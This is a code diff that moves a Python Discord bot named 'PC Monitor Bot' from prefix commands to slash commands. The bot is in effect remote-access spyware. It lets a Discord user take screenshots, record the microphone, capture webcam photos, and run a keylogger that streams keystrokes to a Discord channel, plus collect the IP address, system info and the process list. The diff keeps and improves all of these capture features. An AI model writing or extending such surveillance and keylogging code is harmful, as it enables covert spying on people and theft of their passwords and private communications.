@@ -53,7 +53,7 @@ if not TOKEN:
 intents = discord.Intents.default()
 intents.message_content = True
 intents.members = True
-bot = commands.Bot(command_prefix='/bot ', intents=intents, help_command=None)
+bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)
 
 # variable for keylogger
 keylogger_active = False
@@ -221,11 +221,17 @@ async def send_error(ctx, context, error):
 @bot.event
 async def on_ready():
     logger.info(f'Bot is ready! Logged in as {bot.user.name}')
+    try:
+        synced = await bot.tree.sync()
+        logger.info(f'Synced {len(synced)} command(s)')
+    except Exception as e:
+        logger.error(f'Failed to sync commands: {e}')
+    
     # Find the first available text channel to send the success message
     for guild in bot.guilds:
         for channel in guild.text_channels:
             try:
-                await channel.send(f"The bot has initialized successfully and is now connected. Type `/bot help` to see available commands. <@955067999713361981>")
+                await channel.send(f"The bot has initialized successfully and is now connected. Use slash commands (start typing `/`) to see available commands. <@955067999713361981>")
                 # perm check
                 if not check_camera_permission():
                     await channel.send("[Warning] Camera permission required. Please enable it in System Preferences > Security & Privacy > Privacy > Camera.")
@@ -245,80 +251,100 @@ async def on_message(message):
         return
     await bot.process_commands(message)
 
-@bot.command(name='help')
-async def help_command(ctx):
+@bot.tree.command(name='help', description='Show all available commands')
+async def help_command(interaction: discord.Interaction):
     help_text = """
 **PC Monitor Bot Commands**
-/bot ss - Take a screenshot
-/bot mic - Record audio from the microphone
-/bot media <play|next|prev> - Control media playback
-/bot volume <0-100> - Set system volume
-/bot keylogger <start|stop> - Start or stop the keylogger
-/bot sysinfo - Show system information
-/bot ip - Show IP address
-/bot uptime - Show system uptime
-/bot processes - Show top 10 processes by memory usage (RSS)
-/bot camera - Take a webcam photo
-/bot all - Run all monitoring commands
-/bot debug - Check the status of screenshot, audio recording, camera, and key system functions
+/ss - Take a screenshot
+/mic - Record audio from the microphone
+/media - Control media playback (play/next/prev)
+/volume - Set system volume (0-100%)
+/keylogger - Start or stop the keylogger
+/sysinfo - Show system information
+/ip - Show IP address
+/uptime - Show system uptime
+/processes - Show top 10 processes by memory usage (RSS)
+/camera - Take a webcam photo
+/all - Run all monitoring commands
+/debug - Check the status of screenshot, audio recording, camera, and key system functions
 """
-    await ctx.send(help_text)
+    await interaction.response.send_message(help_text)
 
-@bot.command(name='ss')
-async def screenshot(ctx):
+@bot.tree.command(name='ss', description='Take a screenshot of the current screen')
+async def screenshot(interaction: discord.Interaction):
     try:
+        await interaction.response.defer()
         screenshot_path = take_screenshot()
-        await ctx.send("🟢 Screenshot taken", file=discord.File(screenshot_path))
+        await interaction.followup.send("🟢 Screenshot taken", file=discord.File(screenshot_path))
     except Exception as e:
-        await send_error(ctx, "screenshot", e)
-        await ctx.send("If you are on macOS, check System Settings > Privacy & Security > Screen Recording.")
+        logger.error(f"Error in screenshot: {str(e)}")
+        if not interaction.response.is_done():
+            await interaction.response.send_message(f"[Error in screenshot] {str(e)}\nIf you are on macOS, check System Settings > Privacy & Security > Screen Recording.")
+        else:
+            await interaction.followup.send(f"[Error in screenshot] {str(e)}\nIf you are on macOS, check System Settings > Privacy & Security > Screen Recording.")
     finally:
         if 'screenshot_path' in locals() and os.path.exists(screenshot_path):
             os.remove(screenshot_path)
 
-@bot.command(name='mic')
-async def record(ctx):
+@bot.tree.command(name='mic', description='Record 10 seconds of audio from the microphone')
+async def record(interaction: discord.Interaction):
     try:
+        await interaction.response.defer()
         audio_path = record_audio()
-        await ctx.send("Audio recorded", file=discord.File(audio_path))
+        await interaction.followup.send("🎤 Audio recorded", file=discord.File(audio_path))
         os.remove(audio_path)
     except Exception as e:
         logger.error(f"Error recording audio: {str(e)}")
-        await ctx.send(f"Error recording audio: {str(e)}")
+        if not interaction.response.is_done():
+            await interaction.response.send_message(f"Error recording audio: {str(e)}")
+        else:
+            await interaction.followup.send(f"Error recording audio: {str(e)}")
 
-@bot.command(name='media')
-async def media_control(ctx, action: str):
+@bot.tree.command(name='media', description='Control media playback')
+@discord.app_commands.describe(action='Media action to perform')
+@discord.app_commands.choices(action=[
+    discord.app_commands.Choice(name='Play/Pause', value='play'),
+    discord.app_commands.Choice(name='Next Track', value='next'),
+    discord.app_commands.Choice(name='Previous Track', value='prev')
+])
+async def media_control(interaction: discord.Interaction, action: discord.app_commands.Choice[str]):
     try:
-        action = control_media(action)
-        await ctx.send(f"Media control: {action}")
+        result = control_media(action.value)
+        await interaction.response.send_message(f"🎵 Media control: {action.name}")
     except Exception as e:
         logger.error(f"Error controlling media: {str(e)}")
-        await ctx.send(f"Error controlling media: {str(e)}")
+        await interaction.response.send_message(f"Error controlling media: {str(e)}")
 
-@bot.command(name='volume')
-async def volume(ctx, level: str):
+@bot.tree.command(name='volume', description='Set system volume')
+@discord.app_commands.describe(level='Volume level (0-100)')
+async def volume(interaction: discord.Interaction, level: int):
     success, result = set_volume(level)
     if success:
-        await ctx.send(f"Volume set to {result}%")
+        await interaction.response.send_message(f"🔊 Volume set to {result}%")
     else:
-        await ctx.send(f"Error setting volume: {result}")
+        await interaction.response.send_message(f"Error setting volume: {result}")
 
-@bot.command(name='keylogger')
-async def toggle_keylogger(ctx, action: str):
+@bot.tree.command(name='keylogger', description='Start or stop the keylogger')
+@discord.app_commands.describe(action='Keylogger action')
+@discord.app_commands.choices(action=[
+    discord.app_commands.Choice(name='Start', value='start'),
+    discord.app_commands.Choice(name='Stop', value='stop')
+])
+async def toggle_keylogger(interaction: discord.Interaction, action: discord.app_commands.Choice[str]):
     global keylogger_active, keylogger_listener, keylogger_channel, last_send_time
     try:
-        if action.lower() == 'start':
+        if action.value == 'start':
             if not keylogger_active:
                 keylogger_active = True
                 keylogger_data.clear()
-                keylogger_channel = ctx.channel
+                keylogger_channel = interaction.channel
                 last_send_time = time.time()
                 keylogger_listener = keyboard.Listener(on_press=on_key_press)
                 keylogger_listener.start()
-                await ctx.send("Keylogger started - sending keystrokes every second")
+                await interaction.response.send_message("⌨️ Keylogger started - sending keystrokes every second")
             else:
-                await ctx.send("Keylogger is already running")
-        elif action.lower() == 'stop':
+                await interaction.response.send_message("Keylogger is already running")
+        elif action.value == 'stop':
             if keylogger_active:
                 keylogger_active = False
                 if keylogger_listener:
@@ -326,112 +352,120 @@ async def toggle_keylogger(ctx, action: str):
                     keylogger_listener = None
                 # send remaining data before stop
                 if keylogger_channel and keylogger_data:
-                    await ctx.send(f"```{''.join(keylogger_data)}```")
+                    await interaction.response.send_message(f"```{''.join(keylogger_data)}```")
+                else:
+                    await interaction.response.send_message("⌨️ Keylogger stopped")
                 keylogger_data.clear()
                 keylogger_channel = None
-                await ctx.send("Keylogger stopped")
             else:
-                await ctx.send("Keylogger is not running")
-        else:
-            await ctx.send("Invalid action. Use 'start' or 'stop'")
+                await interaction.response.send_message("Keylogger is not running")
     except Exception as e:
         logger.error(f"Error with keylogger: {str(e)}")
-        await ctx.send(f"Error with keylogger: {str(e)}")
+        await interaction.response.send_message(f"Error with keylogger: {str(e)}")
 
-@bot.command(name='sysinfo')
-async def system_info(ctx):
+@bot.tree.command(name='sysinfo', description='Show detailed system information')
+async def system_info(interaction: discord.Interaction):
     try:
         info = get_system_info()
-        await ctx.send(f"System Info:\n```{info}```")
+        await interaction.response.send_message(f"💻 System Info:\n```{info}```")
     except Exception as e:
         logger.error(f"Error getting system info: {str(e)}")
-        await ctx.send(f"Error getting system info: {str(e)}")
+        await interaction.response.send_message(f"Error getting system info: {str(e)}")
 
-@bot.command(name='ip')
-async def ip_address(ctx):
+@bot.tree.command(name='ip', description='Show the system IP address')
+async def ip_address(interaction: discord.Interaction):
     try:
         ip = get_ip_address()
-        await ctx.send(f"IP Address: {ip}")
+        await interaction.response.send_message(f"🌐 IP Address: {ip}")
     except Exception as e:
         logger.error(f"Error getting IP address: {str(e)}")
-        await ctx.send(f"Error getting IP address: {str(e)}")
+        await interaction.response.send_message(f"Error getting IP address: {str(e)}")
 
-@bot.command(name='uptime')
-async def uptime(ctx):
+@bot.tree.command(name='uptime', description='Show system uptime')
+async def uptime(interaction: discord.Interaction):
     try:
         uptime_str = get_uptime()
-        await ctx.send(f"Uptime: {uptime_str}")
+        await interaction.response.send_message(f"⏱️ Uptime: {uptime_str}")
     except Exception as e:
         logger.error(f"Error getting uptime: {str(e)}")
-        await ctx.send(f"Error getting uptime: {str(e)}")
+        await interaction.response.send_message(f"Error getting uptime: {str(e)}")
 
-@bot.command(name='processes')
-async def processes(ctx):
+@bot.tree.command(name='processes', description='Show top 10 processes by memory usage')
+async def processes(interaction: discord.Interaction):
     try:
         processes = get_top_processes()
         top_processes = "Top 10 processes by memory usage (RSS):\n"
         for proc in processes:
             mb = proc['rss'] / (1024 * 1024)
             top_processes += f"{proc['name']} (PID {proc['pid']}): {mb:.2f} MB\n"
-        await ctx.send(f"```{top_processes}```")
+        await interaction.response.send_message(f"📊 ```{top_processes}```")
     except Exception as e:
         logger.error(f"Error getting processes: {str(e)}")
-        await ctx.send(f"Error getting processes: {str(e)}")
+        await interaction.response.send_message(f"Error getting processes: {str(e)}")
 
-@bot.command(name='camera')
-async def camera(ctx):
+@bot.tree.command(name='camera', description='Take a photo using the webcam')
+async def camera(interaction: discord.Interaction):
     try:
+        await interaction.response.defer()
         photo_path = take_webcam_photo()
         if photo_path:
-            await ctx.send("Webcam photo taken", file=discord.File(photo_path))
+            await interaction.followup.send("📷 Webcam photo taken", file=discord.File(photo_path))
             os.remove(photo_path)
         else:
-            await ctx.send("Failed to capture webcam photo")
+            await interaction.followup.send("Failed to capture webcam photo")
     except Exception as e:
         logger.error(f"Error capturing from camera: {str(e)}")
-        await ctx.send(f"Error capturing from camera: {str(e)}")
+        if not interaction.response.is_done():
+            await interaction.response.send_message(f"Error capturing from camera: {str(e)}")
+        else:
+            await interaction.followup.send(f"Error capturing from camera: {str(e)}")
 
-@bot.command(name='all')
-async def execute_all(ctx):
+@bot.tree.command(name='all', description='Run all monitoring commands')
+async def execute_all(interaction: discord.Interaction):
     try:
+        await interaction.response.defer()
         results = []
         screenshot_path = take_screenshot()
-        await ctx.send("Screenshot taken", file=discord.File(screenshot_path))
+        await interaction.followup.send("🟢 Screenshot taken", file=discord.File(screenshot_path))
         os.remove(screenshot_path)
         results.append("✓ Screenshot")
         audio_path = record_audio()
-        await ctx.send("Audio recorded", file=discord.File(audio_path))
+        await interaction.followup.send("🎤 Audio recorded", file=discord.File(audio_path))
         os.remove(audio_path)
         results.append("✓ Audio recording")
         system_info = get_system_info()
-        await ctx.send(f"System Info:\n```{system_info}```")
+        await interaction.followup.send(f"💻 System Info:\n```{system_info}```")
         results.append("✓ System info")
         ip = get_ip_address()
-        await ctx.send(f"IP Address: {ip}")
+        await interaction.followup.send(f"🌐 IP Address: {ip}")
         results.append("✓ IP address")
         uptime_str = get_uptime()
-        await ctx.send(f"Uptime: {uptime_str}")
+        await interaction.followup.send(f"⏱️ Uptime: {uptime_str}")
         results.append("✓ Uptime")
         processes = get_top_processes()
         top_processes = "Top 10 processes by memory usage (RSS):\n"
         for proc in processes:
             mb = proc['rss'] / (1024 * 1024)
             top_processes += f"{proc['name']} (PID {proc['pid']}): {mb:.2f} MB\n"
-        await ctx.send(f"```{top_processes}```")
+        await interaction.followup.send(f"📊 ```{top_processes}```")
         results.append("✓ Process list")
         photo_path = take_webcam_photo()
         if photo_path:
-            await ctx.send("Webcam photo taken", file=discord.File(photo_path))
+            await interaction.followup.send("📷 Webcam photo taken", file=discord.File(photo_path))
             os.remove(photo_path)
             results.append("✓ Webcam photo")
         summary = "All functions executed:\n" + "\n".join(results)
-        await ctx.send(f"```{summary}```")
+        await interaction.followup.send(f"```{summary}```")
     except Exception as e:
         logger.error(f"Error in execute_all: {str(e)}")
-        await ctx.send(f"Error executing all functions: {str(e)}")
+        if not interaction.response.is_done():
+            await interaction.response.send_message(f"Error executing all functions: {str(e)}")
+        else:
+            await interaction.followup.send(f"Error executing all functions: {str(e)}")
 
-@bot.command(name='debug')
-async def debug(ctx):
+@bot.tree.command(name='debug', description='Test all system functions')
+async def debug(interaction: discord.Interaction):
+    await interaction.response.defer()
     results = []
     # ss test
     try:
@@ -474,7 +508,7 @@ async def debug(ctx):
     except Exception as e:
         tb = traceback.format_exc()
         results.append(f'🔴 Keylogger: FAIL\n{str(e)}\n```{tb}```')
-    await ctx.send('\n'.join(results))
+    await interaction.followup.send('\n'.join(results))
 
 # run the bot
 logger.info('Starting bot...')
